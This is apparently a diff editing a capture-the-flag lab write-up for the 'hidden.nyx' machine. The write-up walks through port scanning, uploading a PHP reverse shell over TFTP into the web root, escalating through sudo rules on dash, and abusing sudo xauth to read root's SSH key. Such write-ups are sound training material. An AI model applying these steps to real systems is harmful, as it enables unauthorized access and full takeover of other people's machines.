@@ -14,7 +14,9 @@ A UDP scan turns up TFTP, sharing the same directory as the web root — enough 
 
 ## Enumeration
 
-A full TCP port scan is run first:
+### Port Enumeration
+
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn hidden.nyx
@@ -25,7 +27,7 @@ PORT   STATE SERVICE REASON
 MAC Address: 08:00:27:E7:7D:7A (Oracle VirtualBox virtual NIC)
 ```
 
-Two TCP ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
+Two TCP ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80 -sCV hidden.nyx
@@ -43,7 +45,7 @@ MAC Address: 08:00:27:E7:7D:7A (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-A UDP scan is run as well, since UDP services don't show up in a TCP-only sweep:
+A UDP scan follows, since UDP services never show up in a TCP-only sweep:
 
 ```bash
 $ sudo nmap -sU --top-ports 1000 hidden.nyx
@@ -54,7 +56,7 @@ PORT    STATE         SERVICE
 MAC Address: 08:00:27:E7:7D:7A (Oracle VirtualBox virtual NIC)
 ```
 
-This turns up **69/udp**, TFTP — a simple, unauthenticated file transfer protocol.
+That turns up **69/udp**, TFTP — a simple, unauthenticated file transfer protocol.
 
 ### Web Enumeration
 
@@ -63,6 +65,7 @@ The main page:
 ```
 http://hidden.nyx
 ```
+
 <img src="../Images/hidden/Pasted image 20260726201645.png"/>
 
 ```bash
@@ -79,9 +82,13 @@ server-status          [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 
 :: Progress: [882188/882188] :: Job [1/1] :: 5882 req/sec :: Duration: [0:03:33] :: Errors: 0 ::
 ```
 
-## Initial Access via TFTP
+The web server only serves the default Apache page — nothing to work with over HTTP alone. TFTP is the more interesting lead.
 
-TFTP's root directory turns out to be the same as the web server's — anything uploaded over TFTP becomes immediately reachable over HTTP. A PHP reverse shell is uploaded directly:
+## Initial Access
+
+### File Upload via TFTP → RCE
+
+TFTP's root directory turns out to be the same as the web server's — anything uploaded over TFTP becomes immediately reachable over HTTP. So a PHP reverse shell goes up over TFTP:
 
 ```bash
 $ tftp hidden.nyx 69
@@ -89,7 +96,7 @@ tftp> put rev_shell.php
 tftp> quit
 ```
 
-It's requested over HTTP to trigger it:
+Requesting it over HTTP triggers it:
 
 ```bash
 $ curl -s "http://hidden.nyx/rev_shell.php"
@@ -110,7 +117,7 @@ www-data@hidden:~$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-The shell is upgraded to something usable:
+A quick pty upgrade makes the shell usable:
 
 ```bash
 python3 -c 'import pty; pty.spawn ("/bin/bash")'
@@ -119,7 +126,9 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-## Escalating to satan
+## Lateral Movement
+
+### Escalating to satan
 
 ```bash
 www-data@hidden:/$ sudo -l
@@ -132,16 +141,11 @@ User www-data may run the following commands on hidden:
     (satan) NOPASSWD: /usr/bin/dash
 ```
 
-The current user can run `/usr/bin/dash` as `satan`:
+The rule lets `www-data` run `/usr/bin/dash` as `satan` — and `dash` is a shell, so that's a direct pivot into `satan`'s account:
 
 ```bash
 www-data@hidden:/$ sudo -u satan /usr/bin/dash
 sudo: unable to resolve host hidden: Name or service not known
-satan@hidden:/$ id
-uid=1000(satan) gid=1000(satan) groups=1000(satan)
-```
-
-```bash
 satan@hidden:/$ id
 uid=1000(satan) gid=1000(satan) groups=1000(satan)
 satan@hidden:/$ ls -l /home/satan
@@ -174,10 +178,10 @@ User satan may run the following commands on hidden:
 satan@hidden:/$ sudo /usr/bin/xauth
 xauth> source /root/.ssh/id_rsa
 ```
+
 <img src="../Images/hidden/Pasted image 20260726202004.png"/>
 
-
-The key's contents are buried inside repeated "unknown command" lines; a `sed` substitution strips everything else, leaving just the recovered key:
+The key's contents are buried inside repeated "unknown command" lines. A `sed` substitution strips everything else, leaving just the recovered key:
 
 ```bash
 $ sed -E 's/^\/usr\/bin\/xauth: \/root\/\.ssh\/id_rsa:[0-9]+:\s+unknown command "(.*)"$/\1/' output.txt > root_rsa
@@ -189,8 +193,6 @@ $ ssh root@hidden.nyx -i root_rsa
 Last login: Thu Jul 13 23:31:02 2023
 root@hidden:~# id
 uid=0(root) gid=0(root) groups=0(root)
-root@hidden:~# ls -l /root
-total 0
 root@hidden:~# ls -la /root
 total 44
 drwx------  6 root root 4096 Jul 26 19:40 .
